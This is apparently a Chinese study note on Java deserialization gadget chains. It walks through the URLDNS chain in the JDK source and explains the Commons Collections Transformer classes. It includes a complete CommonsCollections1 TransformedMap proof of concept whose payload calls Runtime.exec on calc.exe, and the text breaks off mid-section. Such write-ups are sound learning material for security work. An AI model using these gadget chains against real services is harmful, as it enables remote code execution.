<p><code>ht</code>来自于实例化<code>HashMap()</code></p>
<p>触发反序列化的⽅法是 readObject </p>
<p>因为Java开发者（包括Java内置库的开发者）经 常会在这⾥⾯写⾃⼰的逻辑，所以导致可以构造利⽤链。</p>
<p><code>Hashmap()</code>-&gt;<code>readObject</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>putVal(hash(key), key, value, false, false);</code>调用putVal </p>
<p><code>hash </code>⽅法调⽤了<code>key</code>的<code>hashCode()</code>⽅法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据 <code>readobject</code>中的代码得知  key是从序列化串中读出来的    也就是被传入的 </p>
<p>就得 </p>
<p>回到yos中看到 在序列化之前 怎么会是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br></pre></td></tr></table></figure>

<p>因为u是new的url   u是key 所以key.hasncode就得看url.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">        if (hashCode != -1)</span><br><span class="line">            return hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(this);</span><br><span class="line">        return hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到的是 handler.hashcode()</p>
<p>handler 是 URLStreamHandler 对象（的某个⼦类对象），继续跟进其 hashCode ⽅法：</p>
<p><img src="image-20230510190259010.png" alt="image-20230510190259010"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line">    int h = 0;</span><br><span class="line"></span><br><span class="line">    // Generate the protocol part.</span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    if (protocol != null)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the host part.</span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    if (addr != null) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        if (host != null)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Generate the file part.</span><br><span class="line">    String file = u.getFile();</span><br><span class="line">    if (file != null)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the port part.</span><br><span class="line">    if (u.getPort() == -1)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    else</span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    // Generate the ref part.</span><br><span class="line">    String ref = u.getRef();</span><br><span class="line">    if (ref != null)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    return h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现  getHostAddress   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">      if (u.hostAddress != null)</span><br><span class="line">          return u.hostAddress;</span><br><span class="line"></span><br><span class="line">      String host = u.getHost();</span><br><span class="line">      if (host == null || host.equals(&quot;&quot;)) &#123;</span><br><span class="line">          return null;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          try &#123;</span><br><span class="line">              u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">          &#125; catch (UnknownHostException ex) &#123;</span><br><span class="line">              return null;</span><br><span class="line">          &#125; catch (SecurityException se) &#123;</span><br><span class="line">              return null;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      return u.hostAddress;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。到这⾥就不必要再跟了</p>
<p>要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap 中；</p>
<p>然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算 其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() 。 </p>
<p>另外，ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀ 个 SilentURLStreamHandler 类，这不是必须的。</p>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><img src="image-20230510144107486.png" alt="image-20230510144107486"></p>
<p>获取dns解析地址 <a target="_blank" rel="noopener" href="http://e7d123fe.dns.dnsmap.org/">http://e7d123fe.dns.dnsmap.org</a></p>
<p>编写入口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class URLDns &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;J:\\Java安全\\1.txt&quot;));</span><br><span class="line">        Object test = ois.readObject();</span><br><span class="line">        System.out.println(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="image-20230510144623063.png" alt="image-20230510144623063"></p>
<p>这个方法，就是将主机名转换为IP地址，也就是发起了一次DNS解析请求。</p>
<p>总结一下整个利用链：</p>
<ul>
<li><code>HashMap.readObject()</code></li>
<li><code>HashMap.putVal() </code></li>
<li><code>HashMap.hash() </code></li>
<li><code>URL.hashCode() </code></li>
<li><code>URLStreamHandler.hashCode() </code></li>
<li><code>URLStreamHandler.getHostAddress()</code></li>
</ul>
<p><strong>URLDNS中存在ht.put,里面也存在key.hashCode()没啥没有触发DNS解析？</strong></p>
<p><img src="image-20211126143331773.png" alt="image-20211126143331773"></p>
<p><img src="image-20211126143342215.png" alt="image-20211126143342215"></p>
<p>因为在序列化时，重写了<code>URLStreamHander</code>，将<code>getHostAddress</code>置空。</p>
<p><strong>为啥要用反射将hashCode初始值置-1</strong></p>
<p>设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() 。</p>
<h3 id="CommomCollections1"><a href="#CommomCollections1" class="headerlink" title="CommomCollections1"></a>CommomCollections1</h3><h4 id="TransformedMap链子"><a href="#TransformedMap链子" class="headerlink" title="TransformedMap链子"></a>TransformedMap链子</h4><h5 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CommonCollections1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                        new Class[] &#123; String.class&#125;,</span><br><span class="line">                        new String[] &#123;&quot;C:\\WINDOWS\\system32\\calc.exe&quot; &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line">        </span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="P神简化版demo"><a href="#P神简化版demo" class="headerlink" title="P神简化版demo"></a>P神简化版demo</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class CommonCollections1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line">        outerMap.put(&quot;test&quot;, &quot;1sddss3&quot;);</span><br><span class="line">        System.out.println(outerMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p>⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可 以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure>

<p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类</p>
<p>ep;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">map.put(&quot;a&quot;, &quot;apple&quot;);</span><br><span class="line">map.put(&quot;b&quot;, &quot;banana&quot;);</span><br><span class="line"></span><br><span class="line">Transformer&lt;String, String&gt; transformer = new Transformer&lt;String, String&gt;() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public String transform(String input) &#123;</span><br><span class="line">        return input.toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TransformedMap&lt;String, String&gt; transformedMap = new TransformedMap&lt;&gt;(map, null, transformer);</span><br><span class="line">System.out.println(transformedMap.get(&quot;a&quot;)); // 输出 &quot;APPLE&quot;</span><br><span class="line">System.out.println(transformedMap.get(&quot;b&quot;)); // 输出 &quot;BANANA&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h5><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface Transformer &#123;</span><br><span class="line"> public Object transform(Object input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象。</p>
<blockquote>
<p>接收一个对象，然后对对象作一些操作并输出)</p>
</blockquote>
<h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line"> super();</span><br><span class="line"> iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line"> return iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p>
<blockquote>
<p>接受一个对象返回一个常量，无论接收什么对象都返回 iConstant(常量)</p>
</blockquote>
<h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 列化能执⾏任意代码的关键。</p>
<p> 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line"> super();</span><br><span class="line"> iMethodName = methodName;</span><br><span class="line"> iParamTypes = paramTypes;</span><br><span class="line"> iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>传入一个对象，然后反射调用。方法值，参数类型，参数都是可控的</p>
</blockquote>
<h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串 在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p>
<p><img src="image-20230511091807487.png" alt="image-20230511091807487"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">    this.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = this.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>当传⼊的参数是⼀个数组的时候，就开始循环读取，对每个参数调⽤ transform ⽅法,从⽽构造出 ⼀条链。</p>
</blockquote>
<p>理解demo </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">               new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>创建了⼀个ChainedTransformer，其中包含两个Transformer：</p>
<p>第⼀个是ConstantTransformer， 直接返回当前环境的Runtime对象；</p>
<p>第⼆个是InvokerTransformer，执⾏Runtime对象的exec⽅法，参数是 calc。</p>
</blockquote>
<p>当然，这个transformerChain只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的 TransformedMap.decorate ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当然，这个transformerChain只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的</span><br><span class="line">TransformedMap.decorate ：</span><br><span class="line">Map innerMap = new HashMap();</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></pre></td></tr></table></figure>

<p>最后，怎么触发回调呢？就是向Map中放⼊⼀个新的元素：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br></pre></td></tr></table></figure>



<p>代码执⾏demo，它只是⼀个⽤来在本地测试的类。在实际反序列化漏洞中，我们需要将最终⽣成的outerMap对象变成⼀个序列化流 ⼀个demo离⼀个真正可利⽤的POC还有很⼤的距离</p>
<h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>触发这个漏洞的核⼼，在于我们需要向Map中加⼊⼀个新的元素。</p>
<p>在demo中，我们可 以⼿⼯执⾏<code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code>来触发漏洞，但在实际反序列化时，我们需要找到⼀ 个类，它在反序列化的readObject逻辑⾥有类似的写⼊操作</p>
